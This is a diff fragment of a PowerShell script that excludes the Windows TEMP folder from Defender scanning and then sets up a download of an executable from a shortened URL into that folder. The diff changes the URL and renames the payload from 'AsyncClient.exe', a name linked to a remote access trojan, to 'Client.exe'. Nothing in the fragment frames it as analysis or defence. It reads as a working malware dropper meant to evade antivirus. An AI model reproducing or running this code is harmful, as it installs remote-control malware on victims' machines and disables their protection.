@@ -2,10 +2,10 @@
 Add-MpPreference -ExclusionPath $env:TEMP
 
 # Define the URL of the file to download
-$url = 'https://tinyurl.com/3yhak4wk'
+$url = 'https://tinyurl.com/6mt3fcun'
 
 # Set the output path to the temporary folder
-$outputFile = [System.IO.Path]::Combine($env:TEMP, 'AsyncClient.exe')
+$outputFile = [System.IO.Path]::Combine($env:TEMP, 'Client.exe')
 
 # Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
 Start-Sleep -Milliseconds 100
